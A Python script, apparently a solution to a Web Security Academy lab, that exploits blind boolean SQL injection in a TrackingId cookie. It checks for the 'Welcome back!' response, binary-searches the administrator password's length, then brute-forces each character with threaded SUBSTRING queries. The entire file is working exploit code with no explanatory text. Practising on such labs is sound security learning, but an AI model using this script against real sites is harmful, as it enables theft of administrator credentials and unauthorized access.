import string
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from http.cookiejar import CookieJar

URL = 'https://0ab20000031c93fa81df935300d7008f.web-security-academy.net/'
TID = 'C084cH28o3xlEBiU'
PATH = 'filter?category=Accessories'
CHARS = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)


def sessao():
    cj = CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    urllib.request.install_opener(op)
    return op


def requisicao(op, url, cookies):
    req = urllib.request.Request(url)
    req.add_header('Cookie', '; '.join([f"{k}={v}" for k, v in cookies.items()]))
    try:
        resp = op.open(req, timeout=15)
        return resp.read().decode('utf-8')
    except Exception as e:
        print(f"Erro: {e}")
        return ""


def verificar(op):
    txt = requisicao(op, URL + PATH, {
        'TrackingId': f"{TID}' and 1=1 --"
    })
    if 'Welcome back!' in txt:
        print("TrackingId valido!\n")
        return True
    return False


def descobrir_tamanho(op):
    ini, fim, tam = 1, 50, None
    while ini <= fim:
        meio = (ini + fim) // 2
        cond = f"(SELECT length(password) FROM users WHERE username = 'administrator') > {meio}"
        txt = requisicao(op, URL + PATH, {
            'TrackingId': f"{TID}' and {cond} --"
        })
        if 'Welcome back!' in txt:
            print(f"Tamanho > {meio}")
            ini = meio + 1
        else:
            print(f"Tamanho <= {meio}")
            tam = meio
            fim = meio - 1
    print(f"Tamanho da senha: {tam}")
    return tam


def testar_char(op, pos, c):
    txt = requisicao(op, URL + PATH, {
        'TrackingId': f"{TID}' and SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {pos}, 1) = '{c}' --"
    })
    return c, 'Welcome back!' in txt


def extrair_senha(op, tam):
    resultado = []
    while len(resultado) < tam:
        pos = len(resultado) + 1
        print(f"\nPosicao {pos}...")
        achou = None
        with ThreadPoolExecutor(max_workers=10) as ex:
            tarefas = {ex.submit(testar_char, op, pos, c): c for c in CHARS}
            for f in as_completed(tarefas):
                letra, ok = f.result()
                if ok:
                    print(f"+ {letra}", end=" ", flush=True)
                    achou = letra
                    [t.cancel() for t in tarefas]
                    break
                print(f"- {letra}", end=" ", flush=True)
        if achou:
            print(f"\nEncontrado: {achou} na posicao {pos}")
            resultado.append(achou)
            continue
        print(f"\nNenhum caractere encontrado na posicao {pos}")
        break
    senha = ''.join(resultado)
    print(f"\n\nSenha: {senha}")
    return senha


if __name__ == '__main__':
    op = sessao()
    if not verificar(op):
        print("TrackingId invalido, atualize antes de tentar novamente")
        exit()
    tam = descobrir_tamanho(op)
    extrair_senha(op, tam)
    